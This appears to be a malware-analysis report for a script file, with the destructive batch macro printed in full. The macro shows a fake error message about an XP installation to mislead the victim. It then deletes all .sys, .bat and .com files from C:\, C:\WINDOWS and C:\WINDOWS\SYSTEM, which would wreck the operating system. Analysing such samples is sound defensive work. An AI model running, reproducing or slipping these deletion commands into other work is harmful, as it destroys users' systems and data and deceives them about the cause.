behavior.system: May run an executable file or a system command on a Mac

docinfo.macro:
ECHO "Error while removing system files for installation of XP. Please restart your computer then check to make sure your system files are intact"
DEL C:\*.sys
DEL C:\*.bat
DEL C:\*.com
DEL C:\*.SYS
DEL C:\*.BAT
DEL C:\*.COM

DEL C:\WINDOWS\*.sys
DEL C:\WINDOWS\*.bat
DEL C:\WINDOWS\*.com
DEL C:\WINDOWS\*.SYS
DEL C:\WINDOWS\*.BAT
DEL C:\WINDOWS\*.COM

DEL C:\WINDOWS\SYSTEM\*.sys
DEL C:\WINDOWS\SYSTEM\*.bat
DEL C:\WINDOWS\SYSTEM\*.com
DEL C:\WINDOWS\SYSTEM\*.SYS
DEL C:\WINDOWS\SYSTEM\*.BAT
DEL C:\WINDOWS\SYSTEM\*.COM

filetype: ASCII text, with CRLF line terminators

dump: ECHO "Error while removing system files for installation of XP. Please restart your computer then check to make sure your system files are intact"
